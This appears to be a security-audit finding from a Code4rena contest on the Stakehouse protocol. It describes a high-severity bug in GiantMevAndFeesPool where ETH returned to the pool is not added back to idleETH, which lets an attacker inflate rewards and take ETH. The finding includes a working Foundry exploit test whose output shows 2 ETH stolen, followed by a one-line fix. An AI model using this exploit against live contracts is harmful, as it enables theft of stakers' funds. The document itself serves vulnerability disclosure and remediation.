---
tags:
  - lang/solidity
  - sector/staking
  - sector/staking-pool
  - platform/code4rena
  - has/github
  - has/poc
  - severity/high
  - vuln/logic/reward-calculation
  - novelty/variant
  - misassumption/math-is-safe
  - fix/fix-arithmetic
protocol: "[[Stakehouse Protocol]]"
auditors:
  - "[[Lambda]]"
report: "https://code4rena.com/reports/2022-11-stakehouse"
genome:
  - "[[reward-calculation]]"
  - "[[variant]]"
  - "[[direct-drain]]"
  - "[[frontrun-exposure]]"
  - "[[reward-accounting]]"
  - "[[timestamp-dependence]]"
---
# [H-10] `GiantMevAndFeesPool.bringUnusedETHBackIntoGiantPool` function loses the addition of the idleETH which allows attackers to steal most of eth from the Giant Pool

- id: 43033
- impact: HIGH
- protocol: [[Stakehouse Protocol]]
- reporter: Lambda (Code4rena)
- source: https://code4rena.com/reports/2022-11-stakehouse

## Summary


This bug report is about a contract called GiantMevAndFeesPool that is used for staking in a blockchain network. The contract has a function called totalRewardsReceived that calculates the unprocessed rewards. However, there is a bug in the contract that allows an attacker to steal more ETH from the pool.

The bug occurs because the idleETH variable, which is used to track the amount of ETH in the pool, is not correctly updated in all functions. When ETH is sent to the staking pool, the idleETH is decreased, but when ETH is sent back to the GiantMevAndFeesPool, the idleETH is not increased. This results in an incorrect calculation of the accumulatedETHPerLPShare, which allows an attacker to steal more ETH from the pool.

A proof of concept was provided to demonstrate how an attacker can exploit this bug and steal ETH from the pool. The recommended mitigation step is to add a line of code that updates the idleETH variable before a certain function is executed. This will prevent the bug from being exploited and protect the pool from attacks.

The tool used to discover this bug was foundry, and it is recommended to run tests using this tool to identify and fix any similar bugs in the future. The bug has been confirmed by a member of the Stakehouse team, and the recommended mitigation steps should be implemented to prevent any further attacks.

## Details


<https://github.com/code-423n4/2022-11-stakehouse/blob/main/contracts/liquid-staking/GiantMevAndFeesPool.sol#L126-L138><br>
<https://github.com/code-423n4/2022-11-stakehouse/blob/main/contracts/liquid-staking/GiantMevAndFeesPool.sol#L176-L178><br>

The contract GiantMevAndFeesPool override the function totalRewardsReceived:

    return address(this).balance + totalClaimed - idleETH;

The function totalRewardsReceived is used as the current rewards balance to caculate the unprocessed rewards in the function `SyndicateRewardsProcessor._updateAccumulatedETHPerLP`

    uint256 received = totalRewardsReceived();
    uint256 unprocessed = received - totalETHSeen;

The idleETH will be decreased in the function `batchDepositETHForStaking` for sending eth to the staking pool. But the idleETH wont be increased in the function `bringUnusedETHBackIntoGiantPool` which is used to burn lp tokens in the staking pool, and the staking pool will send the eth back to the giant pool. And then because of the diminution of the idleETH, the `accumulatedETHPerLPShare` is added out of thin air. So the attacker can steal more eth from the GiantMevAndFeesPool.

### Proof of Concept

test:<br>
test/foundry/TakeFromGiantPools.t.sol

    pragma solidity ^0.8.13;

    // SPDX-License-Identifier: MIT

    import "forge-std/console.sol";
    import {GiantPoolTests} from "./GiantPools.t.sol";
    import { LPToken } from "../../contracts/liquid-staking/LPToken.sol";

    contract TakeFromGiantPools is GiantPoolTests {
        function testDWclaimRewards() public{
            address nodeRunner = accountOne; vm.deal(nodeRunner, 12 ether);
            address feesAndMevUserOne = accountTwo; vm.deal(feesAndMevUserOne, 4 ether);
            address feesAndMevUserTwo = accountThree; vm.deal(feesAndMevUserTwo, 4 ether);

            // Register BLS key
            registerSingleBLSPubKey(nodeRunner, blsPubKeyOne, accountFour);

            // Deposit ETH into giant fees and mev
            vm.startPrank(feesAndMevUserOne);
            giantFeesAndMevPool.depositETH{value: 4 ether}(4 ether);
            vm.stopPrank();
            vm.startPrank(feesAndMevUserTwo);
            giantFeesAndMevPool.depositETH{value: 4 ether}(4 ether);

            bytes[][] memory blsKeysForVaults = new bytes[][](1);
            blsKeysForVaults[0] = getBytesArrayFromBytes(blsPubKeyOne);

            uint256[][] memory stakeAmountsForVaults = new uint256[][](1);
            stakeAmountsForVaults[0] = getUint256ArrayFromValues(4 ether);
            giantFeesAndMevPool.batchDepositETHForStaking(
                getAddressArrayFromValues(address(manager.stakingFundsVault())),
                getUint256ArrayFromValues(4 ether),
                blsKeysForVaults,
                stakeAmountsForVaults
            );
            vm.warp(block.timestamp+31 minutes);
            LPToken[] memory tokens = new LPToken[](1);
            tokens[0] = manager.stakingFundsVault().lpTokenForKnot(blsPubKeyOne);

            LPToken[][] memory allTokens = new LPToken[][](1);
            allTokens[0] = tokens;
            giantFeesAndMevPool.bringUnusedETHBackIntoGiantPool(
                getAddressArrayFromValues(address(manager.stakingFundsVault())),
                allTokens,
                stakeAmountsForVaults
            );
            // inject a NOOP to skip some functions
            address[] memory stakingFundsVaults = new address[](1);
            bytes memory code = new bytes(1);
            code[0] = 0x00;
            vm.etch(address(0x123), code);
            stakingFundsVaults[0] = address(0x123);
            giantFeesAndMevPool.claimRewards(feesAndMevUserTwo, stakingFundsVaults, blsKeysForVaults);
            vm.stopPrank();
            console.log("user one:", getBalance(feesAndMevUserOne));
            console.log("user two(attacker):", getBalance(feesAndMevUserTwo));
            console.log("giantFeesAndMevPool:", getBalance(address(giantFeesAndMevPool)));
        }

        function getBalance(address addr) internal returns (uint){
            // giant LP : eth at ratio of 1:1
            return addr.balance + giantFeesAndMevPool.lpTokenETH().balanceOf(addr);
        }

    }

run test:

    forge test --match-test testDWclaimRewards -vvv

test log:

    Logs:
      user one: 4000000000000000000
      user two(attacker): 6000000000000000000
      giantFeesAndMevPool: 6000000000000000000

The attacker stole 2 eth from the pool.

### Tools Used

foundry

### Recommended Mitigation Steps

Add

    idleETH += _amounts[i];

before burnLPTokensForETH in the GiantMevAndFeesPool.bringUnusedETHBackIntoGiantPool function.

**[vince0656 (Stakehouse) confirmed](https://github.com/code-423n4/2022-11-stakehouse-findings/issues/173)**



***
